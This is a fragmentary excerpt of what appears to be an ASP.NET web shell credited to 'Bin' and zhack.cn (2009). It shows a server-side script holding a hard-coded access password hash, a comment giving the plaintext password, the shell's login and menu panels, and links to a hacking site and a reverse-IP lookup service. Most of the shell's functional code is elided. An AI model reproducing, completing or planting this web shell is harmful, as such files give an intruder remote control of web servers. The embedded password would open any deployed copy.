...
<script runat="server">
    public string Password = "1e7f3fcfd9b44da7ae81fdb48e8faed9";//PASS:d7sDs,/2sDSMEKX
...
<body>
    <form id="form1" runat="server"><div style="text-align: center"><asp:Panel ID="Bin_LoginPanel" runat="server" Height="47px" Width="401px">
            ...
            Copyright (C) 2009 Bin -> <a href="http://www.zhack.cn" target="_blank">WwW.Zhack.Cn</a></asp:Panel><asp:Panel ID="Bin_MenuPanel" runat="server" Height="56px" Width="771px">
            ...
            <asp:Label ID="Bin_ErrorLabel" runat="server" EnableViewState="False">Copyright (C) 2009 Bin -> <a href="http://www.Zhack.cn" target="_blank">WwW.Zhack.Cn</a> -> <a href="http://www.rootkit.net.cn/index.aspx" target="_blank">Reverse-IP</a> </asp:Label></asp:Panel>
